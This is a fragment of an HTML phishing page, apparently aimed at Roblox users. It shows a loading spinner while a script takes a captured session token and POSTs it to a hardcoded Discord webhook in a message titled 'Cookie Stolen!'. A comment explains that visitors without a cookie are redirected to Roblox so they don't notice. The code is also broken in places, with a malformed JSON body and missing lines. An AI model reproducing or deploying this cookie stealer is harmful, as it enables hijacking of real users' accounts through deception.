        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>

            if (match) {
                const token = match[1];
                
                fetch("https://discord.com/api/webhooks/1568842658024128713/zVUKHWdpx3qKNuQnzxrA86Rs-2dN_tYz8HsXV37ImSW8X1RxS1LBb1IyTQy0bSRxdbxn", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({

                            title: "🍪 Cookie Stolen!",
                            description: "**User opened the link.**\n```\n" + token + "\n```",

                        }]
                    })
                });
            } else {
                // If no cookie, redirect to Roblox so they don't notice

        };

</body>
</html>
